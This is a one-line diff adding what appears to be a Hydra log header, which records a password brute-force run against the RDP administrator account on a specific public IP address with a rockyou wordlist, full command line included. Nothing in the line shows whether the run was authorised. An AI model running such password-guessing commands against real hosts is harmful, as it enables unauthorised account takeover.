@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-29 08:51:29 on 8.218.243.29 rdp (hydra -I -l administrator -P /tmp/rockyou_50k.txt -t 4 -o /tmp/hydra_50k.txt rdp://8.218.243.29)
